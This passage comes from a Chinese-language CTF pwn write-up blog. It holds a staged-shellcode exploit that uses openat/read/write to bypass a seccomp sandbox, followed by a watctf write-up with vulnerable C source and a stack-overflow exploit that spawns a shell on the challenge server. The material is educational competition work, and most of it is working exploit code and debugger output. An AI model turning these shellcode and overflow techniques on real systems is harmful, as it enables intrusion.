class="hljs-number">0x7fff6f9bf068</span> —▸ <span class="hljs-number">0x5b3cb73f2ba6</span> (main) ◂— endbr64 <br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│+<span class="hljs-number">020</span> <span class="hljs-number">0x7fff6f9bf070</span> ◂— <span class="hljs-number">0x100000000</span><br>─────────────────────────────────[ BACKTRACE ]──────────────────────────────────<br> ► <span class="hljs-number">0</span>   <span class="hljs-number">0x79fee9d67000</span> None<br>   <span class="hljs-number">1</span>   <span class="hljs-number">0x5b3cb73f2c4c</span> main+<span class="hljs-number">166</span><br>   <span class="hljs-number">2</span>   <span class="hljs-number">0x79fee94dbd90</span> None<br>   <span class="hljs-number">3</span>   <span class="hljs-number">0x79fee94dbe40</span> __libc_start_main+<span class="hljs-number">128</span><br>   <span class="hljs-number">4</span>   <span class="hljs-number">0x5b3cb73f23a5</span> _start+<span class="hljs-number">37</span><br>────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; <br></code></pre></td></tr></table></figure><p>至于为什么在 pop rsp 后那么久才 push rdx。</p><p>这是因为 pop 和 push 操作都有以 8 字节为单位的，而 shellcode 的执行是单字节执行的，所以需要写 pop 填充在程序流后面等待 syscall。</p><p>至此我们可以轻松构造出 read 来无条件修改 shellcode 进行栈续写衔接程序流 belike:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-number">0x79fee9d6700b</span>    push   rdx<br>  <span class="hljs-number">0x79fee9d6700c</span>    pop    rbx                    RBX =&gt; <span class="hljs-number">0x50f</span><br>  <span class="hljs-number">0x79fee9d6700d</span>    pop    rbx                    RBX =&gt; <span class="hljs-number">0x5b5b5b5b5b5b5b5b</span><br>  <span class="hljs-number">0x79fee9d6700e</span>    pop    rbx                    RBX =&gt; <span class="hljs-number">0x5b5b5b5b5b5b5b5b</span><br>  <span class="hljs-number">0x79fee9d6700f</span>    pop    rbx                    RBX =&gt; <span class="hljs-number">0x5b5b5b5b5b5b5b5b</span><br>► <span class="hljs-number">0x79fee9d67010</span>    syscall  &lt;SYS_read&gt;<br>       fd: <span class="hljs-number">0</span> (socket:[<span class="hljs-number">25238</span>])<br>       buf: <span class="hljs-number">0x79fee9d67000</span> ◂— pop rbx <span class="hljs-comment">/* 0x5c565f5b5b5a5e5b */</span><br>       nbytes: <span class="hljs-number">0x50f</span><br>  <span class="hljs-number">0x79fee9d67012</span>    add    byte ptr [rax], al<br>  <span class="hljs-number">0x79fee9d67014</span>    add    byte ptr [rax], al<br>  <span class="hljs-number">0x79fee9d67016</span>    add    byte ptr [rax], al<br>  <span class="hljs-number">0x79fee9d67018</span>    pop    rbx<br>  <span class="hljs-number">0x79fee9d67019</span>    pop    rbx<br></code></pre></td></tr></table></figure><p>还记得我们说的沙盒吗，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="hljs-built_in">arch</span><br> 0001: 0x15 0x01 0x00 0xc000003e  <span class="hljs-keyword">if</span> (A == ARCH_X86_64) goto 0003<br> 0002: 0x06 0x00 0x00 0x80000000  <span class="hljs-built_in">return</span> KILL_PROCESS<br> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0004: 0x15 0x00 0x01 0x00000000  <span class="hljs-keyword">if</span> (A != <span class="hljs-built_in">read</span>) goto 0006<br> 0005: 0x06 0x00 0x00 0x7fff0000  <span class="hljs-built_in">return</span> ALLOW<br> 0006: 0x15 0x00 0x01 0x00000001  <span class="hljs-keyword">if</span> (A != write) goto 0008<br> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="hljs-built_in">return</span> ALLOW<br> 0008: 0x15 0x00 0x01 0x00000101  <span class="hljs-keyword">if</span> (A != openat) goto 0010<br> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="hljs-built_in">return</span> ALLOW<br> 0010: 0x06 0x00 0x00 0x80000000  <span class="hljs-built_in">return</span> KILL_PROCESS<br><br></code></pre></td></tr></table></figure><p>(感谢临江仙师傅的帮忙 patch)</p><p>你这是典型的 orw 思维，还好我提前准备的对于 openat 函数有所准备，其调用方法为：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tex">openat：<br><br>rdi = -100（代表当前目录）<br><br>rsi = “flag&quot;的地址<br><br>rdx= 0（只读方式打开）<br><br>rax= 257<br></code></pre></td></tr></table></figure><p>所以我的完整 exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;: &quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pid</span>(<span class="hljs-params">process_name</span>):<br>    ps_output = subprocess.check_output([<span class="hljs-string">&#x27;ps&#x27;</span>, <span class="hljs-string">&#x27;-a&#x27;</span>]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    lines = ps_output.splitlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> process_name <span class="hljs-keyword">in</span> line:<br>            pid = line.split()[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">if</span> pid.isdigit():<br>                <span class="hljs-keyword">return</span> pid<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbremote</span>(<span class="hljs-params">pid , name = <span class="hljs-string">&#x27;pwn-box-22.04&#x27;</span> , port = <span class="hljs-string">&#x27;10000&#x27;</span> , ip = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span></span>):<br>    os.system(<span class="hljs-string">&quot;gnome-terminal -- bash -c \&quot;docker exec -it &quot;</span> + name + <span class="hljs-string">&quot; gdbserver :&quot;</span> + port + <span class="hljs-string">&quot; --attach &quot;</span> + pid + <span class="hljs-string">&quot; \&quot;&quot;</span>)<br>    os.system(<span class="hljs-string">&quot;gnome-terminal -- bash -c \&quot;gdb -ex \\\&quot;target remote &quot;</span> + ip + <span class="hljs-string">&quot;:&quot;</span> + port + <span class="hljs-string">&quot;\\\&quot; \&quot;&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br>p = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-comment">#gdbremote(get_pid(&quot;pwn&quot;))</span><br><br>payload = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              pop rbx</span><br><span class="hljs-string">              pop rsi</span><br><span class="hljs-string">              pop rdx</span><br><span class="hljs-string">              pop rbx</span><br><span class="hljs-string">              pop rbx</span><br><span class="hljs-string">              pop rdi</span><br><span class="hljs-string">              push rsi</span><br><span class="hljs-string">              pop rsp</span><br><span class="hljs-string">              pop rbx</span><br><span class="hljs-string">              pop rbx</span><br><span class="hljs-string">              pop rbx</span><br><span class="hljs-string">              push rdx</span><br><span class="hljs-string">              &#x27;&#x27;&#x27;</span>)<br><br>payload = payload.ljust(<span class="hljs-number">0x50f</span>, asm(<span class="hljs-string">&#x27;&#x27;&#x27; pop rbx &#x27;&#x27;&#x27;</span>))<br><br>se(payload)<br><br>pause()<br><br>payload = <span class="hljs-string">b&quot;flag.txt&quot;</span><br>payload = payload.ljust(<span class="hljs-number">0x12</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload+= asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            mov r8, rsi</span><br><span class="hljs-string">            mov rdi,-100</span><br><span class="hljs-string">            xor rdx,rdx</span><br><span class="hljs-string">            mov rax,257</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            mov rdi, 2</span><br><span class="hljs-string">            mov rsi, r8</span><br><span class="hljs-string">            add rsi, 0x500</span><br><span class="hljs-string">            mov rdx, 0x20</span><br><span class="hljs-string">            mov rax, 0</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            mov rdi, 1</span><br><span class="hljs-string">            mov rsi, r8</span><br><span class="hljs-string">            add rsi, 0x500</span><br><span class="hljs-string">            mov rdx, 0x20</span><br><span class="hljs-string">            mov rax, 1</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">              &#x27;&#x27;&#x27;</span>)<br><br>se(payload)<br><br>op()<br></code></pre></td></tr></table></figure><p>事情到这里原本就应该结束了，目前我花了接近一个半小时，离比赛结束还有接近五个小时，此刻问题来了，靶机无法被启动，并且每支队伍仅能同时启动一台靶机，什么意思呢，就是这台靶机被卡住，我们队伍其他靶机也无法启动，主办方是会节省服务器资源的。</p><p>修好后已经是接近一个小时以后，启动后初见端倪，靶机显示给了我一个 socket5 的服务器链接以及用户名和密码。要求我连接代理后再次 nc 192.168.100.2。</p><p>这位的操作更是惊为天人，坎比 ISCC 的静态靶机，pwn师傅应该都比较清楚，linux的终端本身就是不好走全局代理的东西，至少我目前没有什么好办法能让终端走全局代理，而这 socket5 代理我更是没用过，为了解决这个问题，我花了两个小时。</p><p>在从队友手上借到一个 v2ray (Windows端) 后我终于找到新建 socket5 代理的地方，而按照 clash for windows 的经验，这种代理都可以通过局域网共享使用，所以我开启了其局域网共享，并且成功在终端通过配置并使用 proxychains 工具完成了 nc 以及 pwntools 的代理。成功连接上靶机。</p><p>我最后获得 flag 了吗，并没有，初步推测为远程的 flag 不叫 flag 或 flag.txt ，或者 jail 环境挡住了我。</p><p>最后我想说的是，我好不容易拼了这么久的 shellcode ，你却让我输的这么彻底。</p><p>焯！</p><p>我的建议是下次也别搞代理了，把所有的题目全部隐藏，只提供网络，所有的网络资源都需要自己扫描发现，包括解题平台，把附件放一台服务器上，靶机放另外一台服务器上，全看自己发现和进行题目匹配。</p><p>运维能想出这个代理连接的家里确实得请哈基胖了，给运维赞一个【赞】。</p><h2 id="该系列将会流式持续更新-…"><a href="#该系列将会流式持续更新-…" class="headerlink" title="该系列将会流式持续更新 …"></a>该系列将会流式持续更新 …</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>watctf_f25_PWN_WP</title>
    <link href="/2025/09/12/watctf_f25_PWN_WP/"/>
    <url>/2025/09/12/watctf_f25_PWN_WP/</url>
    
    <content type="html"><![CDATA[<h3 id="intro2pwn"><a href="#intro2pwn" class="headerlink" title="intro2pwn"></a>intro2pwn</h3><p>check：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/zlsf/com/watctf/001/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      No RELRO<br>    Stack:      Canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (0x400000)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>source：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">55</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Addr: %p\n&quot;</span>, buf);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    vuln();<br>&#125;<br></code></pre></td></tr></table></figure><p>没有栈可执行保护，并且知道栈地址，而且还有足够的写入和栈溢出，我们可以直接写入 shellcode 然后栈溢出劫持程序流来完成 getshell 。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;: &quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br>p = remote(<span class="hljs-string">&quot;challs.watctf.org&quot;</span>, <span class="hljs-number">1991</span>)<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#loadsym = &quot;glibc-debug --reload-symbols /home/zlsf/sysset/glibc-all-in-one/libs/2.41-6ubuntu1.1_amd64&quot;</span><br><span class="hljs-comment">#code_addr = &quot; ./glibc-2.41.tar.gz --force&quot;</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br>reu(<span class="hljs-string">b&quot;: &quot;</span>)<br>stack_addr = raddr_T()<br>ph(stack_addr,<span class="hljs-string">&quot;stack_addr&quot;</span>)<br><br>payload = asm(shellcraft.sh())<br>payload = payload.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload+= p64(stack_addr)<br><br>sela(<span class="hljs-string">b&quot;\n&quot;</span>, payload)<br><br>op()<br></code></pre></td></tr></table></figure><h3 id="hex-editor-xtended-v2"><a href="#hex-editor-xtended-v2" class="headerlink" title="hex-editor-xtended-v2"></a>hex-editor-xtended-v2</h3><p>check:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/zlsf/com/watctf/002/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>source:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 